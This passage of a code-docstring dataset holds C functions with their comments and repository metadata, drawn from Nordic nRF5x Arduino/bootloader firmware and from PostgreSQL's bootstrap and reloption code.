"nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\targets\\TARGET_NORDIC\\TARGET_NRF5\\us_ticker.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for dispatching outbound events to all registered event handlers.\n *\n * @param[in]  p_event  The event to dispatch.\n */\n", "func_signal": "static void pds_evt_send(pds_evt_t * p_event)", "code": "{\n    for (int i = 0; i < m_pds.n_registrants; i++)\n    {\n        m_pds.evt_handlers[i](p_event);\n    }\n}", "path": "nRF51822\\arduino\\arduino-1.6.x\\hardware\\RBL\\RBL_nRF51822\\cores\\RBL_nRF51822\\ble-nrf51822-master\\source\\nordic_sdk\\components\\ble\\peer_manager\\peer_data_storage.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * Initialize alternative hardware timer as RTX kernel timer\n * This function is directly called by RTX.\n * @note this function shouldn't be called directly.\n * @return  IRQ number of the alternative hardware timer\n */\n", "func_signal": "int os_tick_init (void)", "code": "{\n    common_rtc_init();\n\n    nrf_rtc_cc_set(COMMON_RTC_INSTANCE, OS_TICK_CC_CHANNEL, 0);\n    register_next_tick();\n\n    return nrf_drv_get_IRQn(COMMON_RTC_INSTANCE);\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\targets\\TARGET_NORDIC\\TARGET_NRF5\\us_ticker.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for setting security requirements of a characteristic.\n *\n * @param[in]  level   required security level.\n * @param[out] p_perm  Characteristic security requirements.\n *\n * @return     encoded security level and security mode.\n */\n", "func_signal": "static inline void set_security_req(security_req_t level, ble_gap_conn_sec_mode_t * p_perm)", "code": "{\n\n\n    BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(p_perm);\n    switch (level)\n    {\n        case SEC_NO_ACCESS:\n            BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(p_perm);\n        break;\n        case SEC_OPEN:\n            BLE_GAP_CONN_SEC_MODE_SET_OPEN(p_perm);\n        break;\n        case SEC_JUST_WORKS:\n            BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(p_perm);\n        break;\n        case SEC_MITM:\n            BLE_GAP_CONN_SEC_MODE_SET_ENC_WITH_MITM(p_perm);\n        break;\n        case SEC_SIGNED:\n            BLE_GAP_CONN_SEC_MODE_SET_SIGNED_NO_MITM(p_perm);\n        break;\n        case SEC_SIGNED_MITM:\n            BLE_GAP_CONN_SEC_MODE_SET_SIGNED_WITH_MITM(p_perm);\n        break;\n    }\n    return;\n}", "path": "nRF51822\\arduino\\arduino-1.6.x\\hardware\\RBL\\RBL_nRF51822\\cores\\RBL_nRF51822\\ble-nrf51822-master\\source\\nordic_sdk\\components\\ble\\common\\ble_srv_common.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "// WARNING - DO NOT USE THIS FUNCTION IN END PRODUCT. - WARNING\n// WARNING -         FOR DEBUG PURPOSES ONLY.         - WARNING\n", "func_signal": "void ble_debug_assert_handler(uint32_t error_code, uint32_t line_num, const uint8_t * p_file_name)", "code": "{\n    // Copying parameters to static variables because parameters may not be accessible in debugger.\n    static volatile uint8_t  s_file_name[MAX_LENGTH_FILENAME];\n    static volatile uint16_t s_line_num;\n    static volatile uint32_t s_error_code;\n\n    strncpy((char *)s_file_name, (const char *)p_file_name, MAX_LENGTH_FILENAME - 1);\n    s_file_name[MAX_LENGTH_FILENAME - 1] = '\\0';\n    s_line_num                           = line_num;\n    s_error_code                         = error_code;\n    UNUSED_VARIABLE(s_file_name);\n    UNUSED_VARIABLE(s_line_num);\n    UNUSED_VARIABLE(s_error_code);\n\n    // WARNING: The PRIMASK register is set to disable ALL interrups during writing the error log.\n    // \n    // Do not use __disable_irq() in normal operation.\n    __disable_irq();\n\n    // This function will write error code, filename, and line number to the flash.\n    // In addition, the Cortex-M0 stack memory will also be written to the flash.\n    //(void) ble_error_log_write(error_code, p_file_name, line_num);\n\n    // For debug purposes, this function never returns.\n    // Attach a debugger for tracing the error cause.\n    for (;;)\n    {\n        // Do nothing.\n    }\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\ble\\ble_debug_assert_handler\\ble_debug_assert_handler.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "// Implemented only for 16-bit UUIDs\n", "func_signal": "static uint32_t service_data_encode(const ble_advdata_t * p_advdata,\n                                    uint8_t             * p_encoded_data,\n                                    uint16_t            * p_offset,\n                                    uint16_t              max_size)", "code": "{\n    uint8_t i;\n\n    // Check parameter consistency.\n    if (p_advdata->p_service_data_array == NULL)\n    {\n        return NRF_ERROR_INVALID_PARAM;\n    }\n\n    for (i = 0; i < p_advdata->service_data_count; i++)\n    {\n        ble_advdata_service_data_t * p_service_data;\n        uint32_t                     data_size;\n\n        p_service_data = &p_advdata->p_service_data_array[i];\n        // For now implemented only for 16-bit UUIDs\n        data_size      = AD_TYPE_SERV_DATA_16BIT_UUID_SIZE + p_service_data->data.size;\n\n        // There is only 1 byte intended to encode length which is (data_size + ADV_AD_TYPE_FIELD_SIZE)\n        if(data_size > (0x00FF - ADV_AD_TYPE_FIELD_SIZE))\n        {\n            return NRF_ERROR_DATA_SIZE;\n        }\n\n        // Encode Length and AD Type.\n        p_encoded_data[*p_offset]  = (uint8_t)(ADV_AD_TYPE_FIELD_SIZE + data_size);\n        *p_offset                 += ADV_LENGTH_FIELD_SIZE;\n        p_encoded_data[*p_offset]  = BLE_GAP_AD_TYPE_SERVICE_DATA;\n        *p_offset                 += ADV_AD_TYPE_FIELD_SIZE;\n\n        // Encode service 16-bit UUID.\n        *p_offset += uint16_encode(p_service_data->service_uuid, &p_encoded_data[*p_offset]);\n\n        // Encode additional service data.\n        if (p_service_data->data.size > 0)\n        {\n            if (p_service_data->data.p_data == NULL)\n            {\n                return NRF_ERROR_INVALID_PARAM;\n            }\n            memcpy(&p_encoded_data[*p_offset], p_service_data->data.p_data, p_service_data->data.size);\n            *p_offset += p_service_data->data.size;\n        }\n    }\n\n    return NRF_SUCCESS;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\ble\\common\\ble_advdata.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for initializing the BLE stack.\n *\n * @details Initializes the SoftDevice and the BLE event interrupt.\n *\n * @param[in] init_softdevice  true if SoftDevice should be initialized. The SoftDevice must only \n *                             be initialized if a chip reset has occured. Soft reset from \n *                             application must not reinitialize the SoftDevice.\n */\n", "func_signal": "static void ble_stack_init(bool init_softdevice)", "code": "{\n    uint32_t         err_code;\n    sd_mbr_command_t com = {SD_MBR_COMMAND_INIT_SD, };\n    nrf_clock_lf_cfg_t clock_lf_cfg = NRF_CLOCK_LFCLKSRC;\n\n    if (init_softdevice)\n    {\n        err_code = sd_mbr_command(&com);\n        APP_ERROR_CHECK(err_code);\n    }\n    \n    err_code = sd_softdevice_vector_table_base_set(BOOTLOADER_REGION_START);\n    APP_ERROR_CHECK(err_code);\n   \n    SOFTDEVICE_HANDLER_APPSH_INIT(&clock_lf_cfg, true);\n\n    // Enable BLE stack.\n    ble_enable_params_t ble_enable_params;\n    // Only one connection as a central is used when performing dfu.\n    err_code = softdevice_enable_get_default_config(1, 1, &ble_enable_params);\n    APP_ERROR_CHECK(err_code);\n\n    ble_enable_params.gatts_enable_params.service_changed = IS_SRVC_CHANGED_CHARACT_PRESENT;\n    err_code = softdevice_enable(&ble_enable_params);\n    APP_ERROR_CHECK(err_code);\n    \n    err_code = softdevice_sys_evt_handler_set(sys_evt_dispatch);\n    APP_ERROR_CHECK(err_code);\n}", "path": "nRF52832\\dfu\\rbl_nrf52832_bootloader\\main.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * @brief PWM state transition from (0%, 100%) to (0%, 100%).\n *\n * @param[in] p_instance       PWM instance.\n * @param[in] channel          PWM channel number.\n * @param[in] ticks            Number of clock ticks.\n */\n", "func_signal": "static void pwm_transition_n_to_m(app_pwm_t const * const p_instance,\n                                  uint8_t channel, uint16_t ticks)", "code": "{\n    app_pwm_cb_t            * p_cb     = p_instance->p_cb;\n    app_pwm_channel_cb_t    * p_ch_cb  = &p_cb->channels_cb[channel];\n    nrf_ppi_channel_group_t   p_ppigrp = p_cb->ppi_group;\n\n    pwm_ppi_disable(p_instance);\n    nrf_drv_ppi_group_clear(p_ppigrp);\n    nrf_drv_ppi_channels_include_in_group(\n        nrf_drv_ppi_channel_to_mask(p_cb->ppi_channels[0]) | \n        nrf_drv_ppi_channel_to_mask(p_cb->ppi_channels[1]),\n        p_ppigrp);\n\n    nrf_drv_ppi_channel_assign(p_cb->ppi_channels[0],\n                nrf_drv_timer_compare_event_address_get(p_instance->p_timer, PWM_SECONDARY_CC_CHANNEL),\n                nrf_drv_timer_capture_task_address_get(p_instance->p_timer, channel));\n\n#ifdef NRF52\n    if (ticks + ((nrf_timer_frequency_get(p_instance->p_timer->p_reg) == \n        (m_use_ppi_delay_workaround ? NRF_TIMER_FREQ_8MHz : NRF_TIMER_FREQ_16MHz) ) ? 1U : 0U)\n        < p_ch_cb->pulsewidth)\n#else\n    if (ticks + ((nrf_timer_frequency_get(p_instance->p_timer->p_reg) == NRF_TIMER_FREQ_16MHz) ? 1U : 0U)\n        < p_ch_cb->pulsewidth)\n#endif\n    {\n        // For lower value, we need one more transition. Timer task delay is included.\n        // If prescaler is disabled, one tick must be added because of 1 PCLK16M clock cycle delay.\n        nrf_drv_ppi_channel_assign(p_cb->ppi_channels[1],\n                nrf_drv_timer_compare_event_address_get(p_instance->p_timer, PWM_SECONDARY_CC_CHANNEL),\n                nrf_drv_gpiote_out_task_addr_get(p_ch_cb->gpio_pin));\n    }\n    else\n    {\n        nrf_drv_ppi_channel_remove_from_group(p_cb->ppi_channels[1], p_ppigrp);\n    }\n    p_ch_cb->pulsewidth = ticks;\n    nrf_drv_timer_compare(p_instance->p_timer, (nrf_timer_cc_channel_t) PWM_SECONDARY_CC_CHANNEL, ticks, false);\n    nrf_drv_ppi_group_enable(p_ppigrp);\n    \n    m_pwm_target_value[p_instance->p_timer->instance_id] = ticks;\n    m_pwm_busy[p_instance->p_timer->instance_id] = channel;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\libraries\\pwm\\app_pwm.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * @brief Workaround for PAN-73.\n *\n * @param[in] timer     Timer.\n * @param[in] enable    Enable or disable.\n */\n", "func_signal": "static void pan73_workaround(NRF_TIMER_Type * p_timer, bool enable)", "code": "{\n#ifdef NRF51\n    if (p_timer == NRF_TIMER0)\n    {\n        *(uint32_t *)0x40008C0C = (enable ? 1 : 0);\n    }\n    else if (p_timer == NRF_TIMER1)\n    {\n        *(uint32_t *)0x40009C0C = (enable ? 1 : 0);\n    }\n    else if (p_timer == NRF_TIMER2)\n    {\n        *(uint32_t *)0x4000AC0C = (enable ? 1 : 0);\n    }\n#endif\n    return;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\libraries\\pwm\\app_pwm.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for initializing the button module.\n */\n", "func_signal": "static void buttons_init(void)", "code": "{\n    nrf_gpio_cfg_sense_input(BOOTLOADER_BUTTON,\n                             BUTTON_PULL, \n                             NRF_GPIO_PIN_SENSE_LOW);\n\n}", "path": "nRF52832\\dfu\\rbl_nrf52832_bootloader\\main.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for bootloader main entry.\n */\n", "func_signal": "int main(void)", "code": "{\n    uint32_t err_code;\n    bool     dfu_start = false;\n    bool     app_reset = (NRF_POWER->GPREGRET == BOOTLOADER_DFU_START);\n\n    if (app_reset)\n    {\n        NRF_POWER->GPREGRET = 0;\n    }\n    \n    leds_init();\n\n    // This check ensures that the defined fields in the bootloader corresponds with actual\n    // setting in the chip.\n    APP_ERROR_CHECK_BOOL(*((uint32_t *)NRF_UICR_BOOT_START_ADDRESS) == BOOTLOADER_REGION_START);\n    APP_ERROR_CHECK_BOOL(NRF_FICR->CODEPAGESIZE == CODE_PAGE_SIZE);\n\n    // Initialize.\n    timers_init();\n    buttons_init();\n\n    (void)bootloader_init();\n\n    if (bootloader_dfu_sd_in_progress())\n    {\n        nrf_gpio_pin_clear(UPDATE_IN_PROGRESS_LED);\n\n        err_code = bootloader_dfu_sd_update_continue();\n        APP_ERROR_CHECK(err_code);\n\n        ble_stack_init(!app_reset);\n        scheduler_init();\n\n        err_code = bootloader_dfu_sd_update_finalize();\n        APP_ERROR_CHECK(err_code);\n\n        nrf_gpio_pin_set(UPDATE_IN_PROGRESS_LED);\n    }\n    else\n    {\n        // If stack is present then continue initialization of bootloader.\n        ble_stack_init(!app_reset);\n        scheduler_init();\n    }\n\n    dfu_start  = app_reset;\n    dfu_start |= ((nrf_gpio_pin_read(BOOTLOADER_BUTTON) == 0) ? true: false);\n    \n    \n    \n    if (dfu_start || (!bootloader_app_is_valid(DFU_BANK_0_REGION_START)))\n    {\n        timers_start();\n        nrf_gpio_pin_clear(UPDATE_IN_PROGRESS_LED);\n\n        // Initiate an update of the firmware.\n        err_code = bootloader_dfu_start();\n        APP_ERROR_CHECK(err_code);\n\n        nrf_gpio_pin_set(UPDATE_IN_PROGRESS_LED);\n        timers_stop();\n    }\n\n    if (bootloader_app_is_valid(DFU_BANK_0_REGION_START) && !bootloader_dfu_sd_in_progress())\n    {\n        // Select a bank region to use as application region.\n        // @note: Only applications running from DFU_BANK_0_REGION_START is supported.\n        bootloader_app_start(DFU_BANK_0_REGION_START);\n    }\n    \n    NVIC_SystemReset();\n}", "path": "nRF52832\\dfu\\rbl_nrf52832_bootloader\\main.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for setting the peer data from application in bootloader before reset.\n *\n * @param[in] p_peer_data  Pointer to the peer data containing keys for the connection.\n *\n * @retval NRF_SUCCES      The data was set succesfully.\n * @retval NRF_ERROR_NULL  If a null pointer was passed as argument.\n */\n", "func_signal": "static uint32_t dfu_ble_peer_data_set(dfu_ble_peer_data_t * p_peer_data)", "code": "{\n    if (p_peer_data == NULL)\n    {\n        return NRF_ERROR_NULL;\n    }\n\n    uint32_t src = (uint32_t)p_peer_data;\n    uint32_t dst = (uint32_t)&m_peer_data;\n    // Calculating length in order to check if destination is residing inside source.\n    // Source inside the the destination (calculation underflow) is safe a source is read before \n    // written to destination so that when destination grows into source, the source data is no \n    // longer needed.\n    uint32_t len = dst - src;\n\n    if (src == dst)\n    {\n        // Do nothing as source and destination are identical, just calculate crc below.\n    }\n    else if (len < sizeof(dfu_ble_peer_data_t))\n    {\n        uint32_t i = 0;\n\n        dst += sizeof(dfu_ble_peer_data_t);\n        src += sizeof(dfu_ble_peer_data_t);\n\n        // Copy byte wise backwards when facing overlapping structures.\n        while (i++ <= sizeof(dfu_ble_peer_data_t))\n        {\n            *((uint8_t *)dst--) = *((uint8_t *)src--);\n        }\n    }\n    else\n    {\n        memcpy((void *)dst, (void *)src, sizeof(dfu_ble_peer_data_t));\n    }\n\n    m_peer_data_crc = crc16_compute((uint8_t *)&m_peer_data, sizeof(m_peer_data), NULL);\n\n    return NRF_SUCCESS;\n}", "path": "nRF52832\\dfu\\rbl_nrf52832_bootloader\\dfu_ble_svc.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief   Function for handling the Application's BLE Stack events interrupt.\n *\n * @details This function is called whenever an event is ready to be pulled.\n */\n", "func_signal": "void SOFTDEVICE_EVT_IRQHandler(void)", "code": "{\n    if (m_evt_schedule_func != NULL)\n    {\n        uint32_t err_code = m_evt_schedule_func();\n        APP_ERROR_CHECK(err_code);\n    }\n    else\n    {\n        intern_softdevice_events_execute();\n    }\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\softdevice\\common\\softdevice_handler\\softdevice_handler.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/*\n * build_indices -- fill in all the indexes registered earlier\n */\n", "func_signal": "void\nbuild_indices(void)", "code": "{\n\tfor (; ILHead != NULL; ILHead = ILHead->il_next)\n\t{\n\t\tRelation\theap;\n\t\tRelation\tind;\n\n\t\t/* need not bother with locks during bootstrap */\n\t\theap = heap_open(ILHead->il_heap, NoLock);\n\t\tind = index_open(ILHead->il_ind, NoLock);\n\n\t\tindex_build(heap, ind, ILHead->il_info, false);\n\n\t\tindex_close(ind, NoLock);\n\t\theap_close(heap, NoLock);\n\t}\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n *\t\tAllocateAttribute\n *\n * Note: bootstrap never sets any per-column ACLs, so we only need\n * ATTRIBUTE_FIXED_PART_SIZE space per attribute.\n * ----------------\n */\n", "func_signal": "static Form_pg_attribute\nAllocateAttribute(void)", "code": "{\n\tForm_pg_attribute attribute = (Form_pg_attribute) malloc(ATTRIBUTE_FIXED_PART_SIZE);\n\n\tif (!PointerIsValid(attribute))\n\t\telog(FATAL, \"out of memory\");\n\tMemSet(attribute, 0, ATTRIBUTE_FIXED_PART_SIZE);\n\n\treturn attribute;\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n *\t\tcloserel\n * ----------------\n */\n", "func_signal": "void\ncloserel(char *name)", "code": "{\n\tif (name)\n\t{\n\t\tif (boot_reldesc)\n\t\t{\n\t\t\tif (strcmp(RelationGetRelationName(boot_reldesc), name) != 0)\n\t\t\t\telog(ERROR, \"close of %s when %s was expected\",\n\t\t\t\t\t name, RelationGetRelationName(boot_reldesc));\n\t\t}\n\t\telse\n\t\t\telog(ERROR, \"close of %s before any relation was opened\",\n\t\t\t\t name);\n\t}\n\n\tif (boot_reldesc == NULL)\n\t\telog(ERROR, \"no open relation to close\");\n\telse\n\t{\n\t\telog(DEBUG4, \"close relation %s\",\n\t\t\t RelationGetRelationName(boot_reldesc));\n\t\theap_close(boot_reldesc, NoLock);\n\t\tboot_reldesc = NULL;\n\t}\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Option parser for tablespace reloptions\n */\n", "func_signal": "bytea *\ntablespace_reloptions(Datum reloptions, bool validate)", "code": "{\n\trelopt_value *options;\n\tTableSpaceOpts *tsopts;\n\tint\t\t\tnumoptions;\n\tstatic const relopt_parse_elt tab[] = {\n\t\t{\"random_page_cost\", RELOPT_TYPE_REAL, offsetof(TableSpaceOpts, random_page_cost)},\n\t\t{\"seq_page_cost\", RELOPT_TYPE_REAL, offsetof(TableSpaceOpts, seq_page_cost)}\n\t};\n\n\toptions = parseRelOptions(reloptions, validate, RELOPT_KIND_TABLESPACE,\n\t\t\t\t\t\t\t  &numoptions);\n\n\t/* if none set, we're done */\n\tif (numoptions == 0)\n\t\treturn NULL;\n\n\ttsopts = allocateReloptStruct(sizeof(TableSpaceOpts), options, numoptions);\n\n\tfillRelOptions((void *) tsopts, sizeof(TableSpaceOpts), options, numoptions,\n\t\t\t\t   validate, tab, lengthof(tab));\n\n\tpfree(options);\n\n\treturn (bytea *) tsopts;\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Subroutine for parseRelOptions, to parse and validate a single option's\n * value\n */\n", "func_signal": "static void\nparse_one_reloption(relopt_value *option, char *text_str, int text_len,\n\t\t\t\t\tbool validate)", "code": "{\n\tchar\t   *value;\n\tint\t\t\tvalue_len;\n\tbool\t\tparsed;\n\tbool\t\tnofree = false;\n\n\tif (option->isset && validate)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n\t\t\t\t errmsg(\"parameter \\\"%s\\\" specified more than once\",\n\t\t\t\t\t\toption->gen->name)));\n\n\tvalue_len = text_len - option->gen->namelen - 1;\n\tvalue = (char *) palloc(value_len + 1);\n\tmemcpy(value, text_str + option->gen->namelen + 1, value_len);\n\tvalue[value_len] = '\\0';\n\n\tswitch (option->gen->type)\n\t{\n\t\tcase RELOPT_TYPE_BOOL:\n\t\t\t{\n\t\t\t\tparsed = parse_bool(value, &option->values.bool_val);\n\t\t\t\tif (validate && !parsed)\n\t\t\t\t\tereport(ERROR,\n\t\t\t\t\t   (errmsg(\"invalid value for boolean option \\\"%s\\\": %s\",\n\t\t\t\t\t\t\t   option->gen->name, value)));\n\t\t\t}\n\t\t\tbreak;\n\t\tcase RELOPT_TYPE_INT:\n\t\t\t{\n\t\t\t\trelopt_int *optint = (relopt_int *) option->gen;\n\n\t\t\t\tparsed = parse_int(value, &option->values.int_val, 0, NULL);\n\t\t\t\tif (validate && !parsed)\n\t\t\t\t\tereport(ERROR,\n\t\t\t\t\t   (errmsg(\"invalid value for integer option \\\"%s\\\": %s\",\n\t\t\t\t\t\t\t   option->gen->name, value)));\n\t\t\t\tif (validate && (option->values.int_val < optint->min ||\n\t\t\t\t\t\t\t\t option->values.int_val > optint->max))\n\t\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t  (errmsg(\"value %s out of bounds for option \\\"%s\\\"\",\n\t\t\t\t\t\t\t\t  value, option->gen->name),\n\t\t\t\t\t errdetail(\"Valid values are between \\\"%d\\\" and \\\"%d\\\".\",\n\t\t\t\t\t\t\t   optint->min, optint->max)));\n\t\t\t}\n\t\t\tbreak;\n\t\tcase RELOPT_TYPE_REAL:\n\t\t\t{\n\t\t\t\trelopt_real *optreal = (relopt_real *) option->gen;\n\n\t\t\t\tparsed = parse_real(value, &option->values.real_val);\n\t\t\t\tif (validate && !parsed)\n\t\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t\t(errmsg(\"invalid value for floating point option \\\"%s\\\": %s\",\n\t\t\t\t\t\t\t\t\toption->gen->name, value)));\n\t\t\t\tif (validate && (option->values.real_val < optreal->min ||\n\t\t\t\t\t\t\t\t option->values.real_val > optreal->max))\n\t\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t  (errmsg(\"value %s out of bounds for option \\\"%s\\\"\",\n\t\t\t\t\t\t\t\t  value, option->gen->name),\n\t\t\t\t\t errdetail(\"Valid values are between \\\"%f\\\" and \\\"%f\\\".\",\n\t\t\t\t\t\t\t   optreal->min, optreal->max)));\n\t\t\t}\n\t\t\tbreak;\n\t\tcase RELOPT_TYPE_STRING:\n\t\t\t{\n\t\t\t\trelopt_string *optstring = (relopt_string *) option->gen;\n\n\t\t\t\toption->values.string_val = value;\n\t\t\t\tnofree = true;\n\t\t\t\tif (validate && optstring->validate_cb)\n\t\t\t\t\t(optstring->validate_cb) (value);\n\t\t\t\tparsed = true;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\telog(ERROR, \"unsupported reloption type %d\", option->gen->type);\n\t\t\tparsed = true;\t\t/* quiet compiler */\n\t\t\tbreak;\n\t}\n\n\tif (parsed)\n\t\toption->isset = true;\n\tif (!nofree)\n\t\tpfree(value);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * add_real_reloption\n *\t\tAdd a new float reloption\n */\n", "func_signal": "void\nadd_real_reloption(bits32 kinds, char *name, char *desc, double default_val,\n\t\t\t\t   double min_val, double max_val)", "code": "{\n\trelopt_real *newoption;\n\n\tnewoption = (relopt_real *) allocate_reloption(kinds, RELOPT_TYPE_REAL,\n\t\t\t\t\t\t\t\t\t\t\t\t   name, desc);\n\tnewoption->default_val = default_val;\n\tnewoption->min = min_val;\n\tnewoption->max = max_val;\n\n\tadd_reloption((relopt_gen *) newoption);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * allocate_reloption\n *\t\tAllocate a new reloption and initialize the type-agnostic fields\n *\t\t(for types other than string)\n */\n", "func_signal": "static relopt_gen *\nallocate_reloption(bits32 kinds, int type, char *name, char *desc)", "code": "{\n\tMemoryContext oldcxt;\n\tsize_t\t\tsize;\n\trelopt_gen *newoption;\n\n\tAssert(type != RELOPT_TYPE_STRING);\n\n\toldcxt = MemoryContextSwitchTo(TopMemoryContext);\n\n\tswitch (type)\n\t{\n\t\tcase RELOPT_TYPE_BOOL:\n\t\t\tsize = sizeof(relopt_bool);\n\t\t\tbreak;\n\t\tcase RELOPT_TYPE_INT:\n\t\t\tsize = sizeof(relopt_int);\n\t\t\tbreak;\n\t\tcase RELOPT_TYPE_REAL:\n\t\t\tsize = sizeof(relopt_real);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\telog(ERROR, \"unsupported option type\");\n\t\t\treturn NULL;\t\t/* keep compiler quiet */\n\t}\n\n\tnewoption = palloc(size);\n\n\tnewoption->name = pstrdup(name);\n\tif (desc)\n\t\tnewoption->desc = pstrdup(desc);\n\telse\n\t\tnewoption->desc = NULL;\n\tnewoption->kinds = kinds;\n\tnewoption->namelen = strlen(name);\n\tnewoption->type = type;\n\n\tMemoryContextSwitchTo(oldcxt);\n\n\treturn newoption;\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n *\t\tgettype\n *\n * NB: this is really ugly; it will return an integer index into TypInfo[],\n * and not an OID at all, until the first reference to a type not known in\n * TypInfo[].  At that point it will read and cache pg_type in the Typ array,\n * and subsequently return a real OID (and set the global pointer Ap to\n * point at the found row in Typ).\tSo caller must check whether Typ is\n * still NULL to determine what the return value is!\n * ----------------\n */\n", "func_signal": "static Oid\ngettype(char *type)", "code": "{\n\tint\t\t\ti;\n\tRelation\trel;\n\tHeapScanDesc scan;\n\tHeapTuple\ttup;\n\tstruct typmap **app;\n\n\tif (Typ != NULL)\n\t{\n\t\tfor (app = Typ; *app != NULL; app++)\n\t\t{\n\t\t\tif (strncmp(NameStr((*app)->am_typ.typname), type, NAMEDATALEN) == 0)\n\t\t\t{\n\t\t\t\tAp = *app;\n\t\t\t\treturn (*app)->am_oid;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tfor (i = 0; i < n_types; i++)\n\t\t{\n\t\t\tif (strncmp(type, TypInfo[i].name, NAMEDATALEN) == 0)\n\t\t\t\treturn i;\n\t\t}\n\t\telog(DEBUG4, \"external type: %s\", type);\n\t\trel = heap_open(TypeRelationId, NoLock);\n\t\tscan = heap_beginscan(rel, SnapshotNow, 0, NULL);\n\t\ti = 0;\n\t\twhile ((tup = heap_getnext(scan, ForwardScanDirection)) != NULL)\n\t\t\t++i;\n\t\theap_endscan(scan);\n\t\tapp = Typ = ALLOC(struct typmap *, i + 1);\n\t\twhile (i-- > 0)\n\t\t\t*app++ = ALLOC(struct typmap, 1);\n\t\t*app = NULL;\n\t\tscan = heap_beginscan(rel, SnapshotNow, 0, NULL);\n\t\tapp = Typ;\n\t\twhile ((tup = heap_getnext(scan, ForwardScanDirection)) != NULL)\n\t\t{\n\t\t\t(*app)->am_oid = HeapTupleGetOid(tup);\n\t\t\tmemmove((char *) &(*app++)->am_typ,\n\t\t\t\t\t(char *) GETSTRUCT(tup),\n\t\t\t\t\tsizeof((*app)->am_typ));\n\t\t}\n\t\theap_endscan(scan);\n\t\theap_close(rel, NoLock);\n\t\treturn gettype(type);\n\t}\n\telog(ERROR, \"unrecognized type \\\"%s\\\"\", type);\n\t/* not reached, here to make compiler happy */\n\treturn 0;\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n *\t\tInsertOneNull\n * ----------------\n */\n", "func_signal": "void\nInsertOneNull(int i)", "code": "{\n\telog(DEBUG4, \"inserting column %d NULL\", i);\n\tAssert(i >= 0 || i < MAXATTR);\n\tvalues[i] = PointerGetDatum(NULL);\n\tNulls[i] = true;\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
